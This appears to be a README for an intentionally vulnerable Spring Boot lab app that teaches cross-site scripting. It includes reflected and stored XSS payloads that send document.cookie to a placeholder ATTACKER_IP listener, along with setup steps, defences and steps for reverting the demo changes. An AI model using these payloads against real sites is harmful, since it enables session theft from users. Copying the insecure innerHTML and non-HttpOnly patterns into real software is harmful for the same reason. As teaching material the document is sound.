# vuln-xss-app — Quick README (summary)

**Purpose:** Local, controlled vulnerability demo for Cross-Site Scripting (XSS). Use in isolated VMs only for education and assignments.

> ⚠️ Safety: Run this only in machines and networks you control. Use fake/demo data only (e.g. `session=FAKE_FOR_DEMO`). Do not target external systems.

---

## What’s included

- `pom.xml` — Maven project
- `src/main/java/...` — Spring Boot server
- `src/main/resources/static/` — front-end HTML (search.html, comments.html, etc.)
- `attacker_listener.py` — simple Python listener (lab-only)
- `DemoCookieController.java` — demo endpoint to set a JS-readable cookie (optional)

---

## Quick setup (Ubuntu VM)

1. Install prerequisites:

```bash
sudo apt update
sudo apt install -y openjdk-17-jdk maven python3 python3-pip
```

2. Build the project (from project root):

```bash
mvn clean install -U
```

3. Run the app (example port 3001):

```bash
mvn spring-boot:run -Dspring-boot.run.arguments="--server.port=3001"
```

---

## Demo cookie (server-side) — `/set-demo-cookie`

Visit `/set-demo-cookie` to set a **demo** cookie that JavaScript can read:

```text
GET /set-demo-cookie
# sets: session=FAKE_FOR_DEMO (HttpOnly=false) — demo-only
```

**Note:** In production session cookies must be `HttpOnly`.

---

## Attacker listener (on attacker VM)

Save and run `attacker_listener.py` on the attacker VM to capture exfil requests:

```bash
python3 attacker_listener.py
# listens on 0.0.0.0:9000
```

The listener logs GET/POST requests and prints query params and headers.

---

## Example attack payloads

Replace `ATTACKER_IP` with your attacker VM IP (e.g. `10.0.2.6`) and `APP_PORT` with your app port (e.g. `3001`).

**Reflected (URL) — exfiltrate cookie via img onerror**

```
http://localhost:APP_PORT/search.html?q=<img src=x onerror="new Image().src='http://ATTACKER_IP:9000/log?c='+encodeURIComponent(document.cookie)">
```

(URL-encode if pasting into address bar.)

**Stored (comment)** — post this as a comment body and reload the comments page:

```html
<img
  src="x"
  onerror="new Image().src='http://ATTACKER_IP:9000/log?c='+encodeURIComponent(document.cookie)"
/>
```

**Reliable visual payloads (for demos):**

```html
<img
  src="x"
  onerror="console.log('XSS fired'); document.body.style.border='6px solid red'"
/>
<svg/onload=console.log('svg onload fired')>
```

---

## Testing & verification

1. Start attacker listener on attacker VM: `python3 attacker_listener.py`.
2. On client (victim) browser, visit `/set-demo-cookie` to set `session=FAKE_FOR_DEMO`.
3. Trigger reflected or stored payload. Watch attacker listener log showing `c: ['session=FAKE_FOR_DEMO']`.
4. Capture screenshots: listener output, browser console showing `document.cookie`, Elements showing injected node, and the URL or posted comment with the payload.

---

## Common troubleshooting

- If `curl -I` returns "Unsupported method ('HEAD')", use the updated `attacker_listener.py` that implements `do_HEAD` (included).
- If listener gets no requests: check VM networking (host-only/internal/bridged), firewall (`ufw`), and that listener binds to `0.0.0.0`.
- If `<script>` payloads don’t execute: modern browsers often do not execute `<script>` tags inserted via `innerHTML`. Use `img onerror` or append a `script` element via Console or a demo patch.

---

## Defenses (apply after demo)

1. **Sanitize input** server-side (e.g. `Jsoup.clean(input, Safelist.none())`) before storing or reflecting.
2. **Escape output** on frontend: use `element.textContent = userInput` instead of `innerHTML`.
3. **Set HttpOnly** on session cookies so `document.cookie` cannot read them.
4. **Content-Security-Policy** header to block inline JS (as second line of defense).
5. Add security headers: `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`.

---

## Reverting demo changes (must do)

- Remove `DemoCookieController` or set cookie to `HttpOnly=true`.
- Revert any demo-only front-end code that auto-executes script content from query params or stored comments.
- Replace any `innerHTML` use for untrusted data with `textContent` or sanitized HTML.

*
